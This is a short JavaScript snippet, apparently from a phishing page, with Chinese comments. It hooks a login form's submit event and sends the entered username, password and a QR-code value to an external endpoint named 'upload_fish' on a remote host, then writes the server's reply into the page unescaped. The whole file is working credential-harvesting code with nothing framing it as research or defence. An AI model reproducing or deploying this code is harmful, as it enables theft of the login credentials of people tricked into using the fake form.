var xhr = new XMLHttpRequest();
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // 阻止表单默认提交行为
	var name = document.getElementById("user").value; 
	var password = document.getElementById("password").value;
	var qrcode = document.getElementById("qrcode").value;
	var url = "https://yxvm.gzx7301.top:23056/upload_fish?user=" + encodeURIComponent(name) + "&password=" + encodeURIComponent(password) + "&qr=" + encodeURIComponent(qrcode);

    xhr.onreadystatechange = function() {
        document.getElementById('result').innerHTML = xhr.responseText;
    };
    xhr.open("GET", url, true);
    // 发送请求
    xhr.send();
});